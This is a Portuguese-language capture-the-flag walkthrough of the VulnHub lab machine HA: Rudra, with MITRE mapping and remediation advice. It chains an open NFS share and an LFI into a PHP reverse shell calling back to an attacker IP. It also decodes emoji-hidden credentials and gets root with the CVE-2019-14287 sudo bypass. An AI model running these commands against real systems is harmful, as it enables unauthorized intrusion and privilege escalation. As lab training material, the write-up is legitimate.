# HA: Rudra — O Feroz Esconde Segredos em Emoji, Depois CVE-2019-14287 Quebra as Correntes

Rudra é a antiga divindade védica das tempestades e da natureza selvagem, a forma feroz de Shiva antes de se tornar Shankara. Indômito, preciso e perigoso quando provocado. HA: Rudra está à altura do nome. Um compartilhamento NFS entrega um ponto de entrada via LFI. Tabelas MySQL apontam para credenciais codificadas em emoji via a ferramenta de esteganografia Cloakify. E CVE-2019-14287, o notório bypass de ID de usuário do sudo, entrega root transformando `-1` em `0`. Técnica insana, mano. Pouco comentada na maioria dos writeups, mas não aqui.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | HA: Rudra |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-rudra,445/ |
| **Técnicas** | Enumeração de serviços Nmap, enumeração e montagem de compartilhamento NFS, descoberta de LFI com dirb, shell PHP reverso via cadeia NFS+LFI, estabilização de shell, enumeração de credenciais MySQL, decode de esteganografia Cloakify por emoji, login SSH, bypass sudo CVE-2019-14287 |
| **CVEs** | CVE-2019-14287 (bypass de privilégio sudo via ID de usuário -1), CWE-22 (Path Traversal: LFI via parâmetro file), CWE-284 (Controle de Acesso Impróprio: NFS exportado para wildcard) |
| **Grupos APT** | APT33: encadeia exposição NFS com LFI web para acesso inicial em alvos de infraestrutura Linux; APT41: usa esteganografia de sistema de arquivos e codificação para armazenar credenciais, contornando ferramentas padrão de detecção de segredos |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80), NFS (2049)
  → showmount -e → /home/shivay exportado para *
  → mkdir /tmp/ignite && mount -t nfs alvo:/home/shivay /tmp/ignite
  → ls /tmp/ignite → mahadev.txt (dicas)
  → dirb http://alvo → robots.txt → nandi.php
  → curl nandi.php?file=/etc/passwd → LFI confirmado
  → usuários: rudra, shivay, mahakaal
  → cp php-reverse-shell.php /tmp/ignite/shell.php
  → nc -lvnp 4444 (atacante)
  → curl nandi.php?file=/home/shivay/shell.php → shell reverso
  → mysql -u root → use mahadev; select * from hint
  → dica: verificar /media → ferramenta Cloakify mencionada
  → cat /media/creds → credencial codificada em emoji
  → cloakifyFactory.py → Decloakify → cifra emoji → mahakaal:kalbhairav
  → ssh mahakaal@alvo
  → sudo -l → (ALL) /usr/bin/watch
  → sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  → uid=0(root) → cat /root/final.txt
```

---

## Metodologia

1. Descoberta de host e varredura completa de portas (TCP + verificar NFS 2049)
2. Enumeração de compartilhamento NFS e montagem de /home/shivay
3. Brute-force de diretórios para encontrar ponto de entrada LFI nandi.php
4. Confirmação de LFI via leitura de /etc/passwd
5. Shell PHP reverso colocado no compartilhamento NFS, acionado via parâmetro LFI
6. Estabilização do shell
7. Enumeração MySQL para dicas de credenciais
8. Decode de esteganografia emoji Cloakify para recuperar credenciais de mahakaal
9. SSH como mahakaal
10. Bypass CVE-2019-14287 sudo watch para root

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -A 192.168.1.101
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Apache httpd
2049/tcp open  nfs     (serviço NFS)
```

NFS na porta 2049 é a descoberta crítica. Enumere imediatamente.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração NFS e Montagem

```bash
showmount -e 192.168.1.101
```

```
Export list for 192.168.1.101:
/home/shivay  *
```

O compartilhamento NFS está exportado para wildcard (`*`): qualquer host pode montá-lo. Monte:

```bash
mkdir /tmp/ignite
mount -t nfs 192.168.1.101:/home/shivay /tmp/ignite
ls -la /tmp/ignite
cat /tmp/ignite/mahadev.txt
```

`mahadev.txt` contém dicas sobre a máquina.

**Nota do mundo real:** Compartilhamentos NFS exportados para `*` permitem que qualquer máquina na rede monte e leia (ou escreva) arquivos. É uma configuração incorreta crítica que habilita o ataque encadeado NFS+LFI nesta máquina. Múltiplos ambientes empresariais ainda têm exports NFS acessíveis para todos provenientes de migrações legadas.

**MITRE ATT&CK:** T1135 — Descoberta de Compartilhamento de Rede; T1039 — Dados de Unidade de Rede Compartilhada

---

## Passo 3 — Brute-Force de Diretórios para Encontrar LFI

```bash
dirb http://192.168.1.101/
# Saída inclui: robots.txt → nandi.php
```

Verifique robots.txt:

```bash
curl http://192.168.1.101/robots.txt
```

Acesse `http://192.168.1.101/nandi.php` — página em branco, aguarda parâmetro `file`.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 4 — Confirmar LFI

```bash
curl "http://192.168.1.101/nandi.php?file=/etc/passwd"
```

O servidor retorna o `/etc/passwd` completo. LFI confirmado.

Usuários identificados: `rudra`, `shivay`, `mahakaal`.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1203 — Exploração para Execução no Cliente

---

## Passo 5 — Shell PHP Reverso via NFS + LFI

Como temos acesso de escrita ao NFS montado `/home/shivay`, podemos colocar um shell PHP lá e acioná-lo via parâmetro LFI:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/ignite/shell.php
# Editar: $ip = '192.168.1.108'; $port = 4444;
```

Inicie o listener:

```bash
nc -lvnp 4444
```

Acione o shell via LFI:

```bash
curl "http://192.168.1.101/nandi.php?file=/home/shivay/shell.php"
```

Shell reverso como `www-data` conecta.

**Nota do mundo real:** A cadeia NFS+LFI é um ataque de precisão: NFS fornece acesso de escrita a um local que o servidor web pode ler, e LFI fornece execução. Nenhuma vulnerabilidade sozinha dá execução de código; a combinação sim. Por isso a defesa em profundidade é importante.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.004 — Shell Unix

---

## Passo 6 — Estabilização do Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Passo 7 — Enumeração MySQL para Dicas

MySQL está rodando localmente:

```bash
netstat -tulnp | grep 3306
# 127.0.0.1:3306

mysql -u root -p
# Tente: senha do mahadev.txt ou vazia
use mahadev;
show tables;
select * from hint;
```

A tabela hint aponta para arquivos em `/media` e menciona a ferramenta Cloakify.

**MITRE ATT&CK:** T1005 — Dados do Sistema Local; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 8 — Decode Cloakify Emoji: Recuperação de Credenciais

```bash
ls /media
# creds  hint

cat /media/creds
# Exibe caracteres emoji (símbolos Unicode codificando uma credencial oculta)
```

Na máquina atacante, use o Cloakify Factory para decodificar:

```bash
git clone https://github.com/TryCatchHCF/Cloakify
cd Cloakify
python cloakifyFactory.py
```

Selecione opção 2 (Decloakify), escolha a cifra emoji da lista, cole o conteúdo de `creds`, selecione "sem ruído adicionado".

Credencial decodificada: **`mahakaal:kalbhairav`**

**Nota do mundo real:** Esteganografia textual usando conjuntos de símbolos Unicode (emoji, Braille, cartas de baralho) codifica dados arbitrários à vista de todos. Cloakify é usado por red teamers para exfiltrar dados por canais que filtram padrões "suspeitos". Sua presença em um sistema vítima é um indicador de comprometimento.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados; T1552 — Credenciais Não Protegidas

---

## Passo 9 — Login SSH como mahakaal

```bash
ssh mahakaal@192.168.1.101
# Senha: kalbhairav
```

Verifique direitos sudo:

```bash
sudo -l
# (ALL) /usr/bin/watch
```

mahakaal pode executar `watch` como qualquer usuário. A restrição parece limitante. Mas CVE-2019-14287 muda tudo.

**MITRE ATT&CK:** T1078 — Contas Válidas; T1021.004 — Serviços Remotos: SSH

---

## Passo 10 — CVE-2019-14287: Bypass de ID de Usuário Sudo para Root

CVE-2019-14287 afeta versões sudo anteriores a 1.8.28. Quando o sudoers usa `(ALL)` em vez de `(ALL:ALL)`, passar o ID de usuário `-1` para o sudo ignora restrições porque C interpreta `getpwuid(-1)` como retornando UID 0 (root):

```bash
sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0'
```

Shell root obtido.

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
cat final.txt
```

(☞ﾟヮﾟ)☞ Root. A tempestade de Rudra domada.

**Nota do mundo real:** CVE-2019-14287 foi divulgado em outubro de 2019 e corrigido no sudo 1.8.28. Muitas organizações rodando versões mais antigas do Ubuntu ou Debian ainda tinham sudo sem patch meses após a divulgação. A técnica explora um caso de borda específico em como o sudo analisa identificadores de usuário.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Utilizado para |
|---|---|---|---|
| Dica | Conteúdo de mahadev.txt | NFS montado /home/shivay | Contexto de enumeração |
| Dados LFI | Conteúdo de /etc/passwd | nandi.php?file=/etc/passwd | Enumeração de usuários |
| Shell inicial | www-data | Cadeia de shell PHP NFS+LFI | Acesso inicial |
| Credencial Cloakify | mahakaal:kalbhairav | /media/creds (emoji decodificado) | Login SSH |
| Flag root | /root/final.txt | Bypass sudo CVE-2019-14287 | Capturada |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | NFS exportado para wildcard habilita ataque encadeado NFS+LFI | Exports NFS acessíveis para todos são uma configuração incorreta crítica em ambientes Linux empresariais | Restrinja exports NFS a IPs específicos; sempre monte com nosuid,noexec |
| 2 | Cadeia LFI para NFS: nenhuma vulnerabilidade sozinha dá RCE | Defesa em profundidade é demonstrada pelo contraste: corrija ambos LFI e NFS para quebrar a cadeia | Trate cada vulnerabilidade independentemente; vulnerabilidades combinadas criam severidade crítica |
| 3 | Esteganografia emoji (Cloakify) esconde credenciais à vista de todos | Usada em exfiltração de dados red team; sua presença em um sistema indica comprometimento | Implemente controles DLP que verificam padrões de codificação Unicode; trate Cloakify como IoC |
| 4 | CVE-2019-14287: sudo -u#-1 ignora restrições de usuário | Afetou todas as versões sudo antes de 1.8.28; muitos sistemas estiveram expostos por meses | Faça patch do sudo imediatamente; verifique: `sudo --version` (deve ser 1.8.28+) |
| 5 | Tabela de dicas MySQL leva à localização de credenciais | Bancos de dados são usados por designers de CTF para armazenar dicas, mas atacantes reais também encontram tabelas de credenciais | Sempre enumere todos os bancos de dados e tabelas durante pós-exploração |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Compartilhamento de Rede | T1135 |
| Coleta | Coleta | Dados de Unidade de Rede Compartilhada | T1039 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Execução | Execução | Interpretador de Script: Shell Unix | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Protegidas | T1552 |
| Acesso a Credenciais | Acesso a Credenciais | Arquivos ou Informações Ofuscados (Cloakify) | T1027 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação: Sudo (CVE-2019-14287) | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Restringir exports NFS**: mudar `/etc/exports` de `*` para IPs específicos; remontar com `nosuid,noexec,nodev`
2. **Corrigir LFI em nandi.php**: listar em whitelist os caminhos de arquivo permitidos; nunca passar `$_GET['file']` diretamente para `include()`
3. **Fazer patch do sudo**: atualizar para versão 1.8.28 ou posterior: `apt upgrade sudo`
4. **Remover Cloakify do sistema**: se encontrado, tratar como IoC; investigar como chegou lá; verificar exfiltração de dados
5. **Rotacionar credenciais de mahakaal**: kalbhairav está comprometida; rotacionar imediatamente
6. **Restringir MySQL**: executar MySQL como usuário não-root; forçar senhas fortes; restringir acesso de rede

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (restrições de export NFS; patch LFI)
- **D3-OAM**: Gerenciamento Administrativo de SO (patch sudo; opções de montagem NFS)
- **D3-HBPI**: Hardening de Integridade de Pipeline de Build (sem credenciais em sistema de arquivos fora do gerenciador de segredos)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar exports NFS; auditar versões sudo em todos os hosts Linux |
| Proteger | Controle de Acesso | Restringir NFS a hosts específicos; fazer patch do sudo; corrigir LFI |
| Proteger | Segurança de Dados | Remover credenciais do sistema de arquivos; usar gerenciador de segredos |
| Detectar | Anomalias e Eventos | Alertar sobre montagem NFS de hosts inesperados; detectar tentativas de LFI |
| Responder | Planejamento de Resposta | Patch CVE-2019-14287; rotacionar credenciais expostas; remover Cloakify |
| Recuperar | Planejamento de Recuperação | Auditar todos os exports NFS; verificar versão sudo em todos os hosts Linux |

---

## Reflexões Finais

HA: Rudra é uma máquina tecnicamente rica que recompensa paciência e completude. A cadeia NFS+LFI é elegante, o decode Cloakify é único (a maioria dos jogadores de CTF nunca viu credenciais codificadas em emoji antes), e CVE-2019-14287 é uma CVE do mundo real que afetou sistemas de produção globalmente.

Rudra o feroz testa seu kit completo. Perdeu a varredura UDP? Perdeu o NFS. Pulou a enumeração MySQL? Perdeu a dica do Cloakify. Não conhece CVE-2019-14287? A entrada do sudo parece inútil. Conhece as três? Você dança por esta máquina como a própria tempestade.

Caramba, que máquina insana. Sensacional demais.

Thanks guys!! (❍ᴥ❍ʋ)
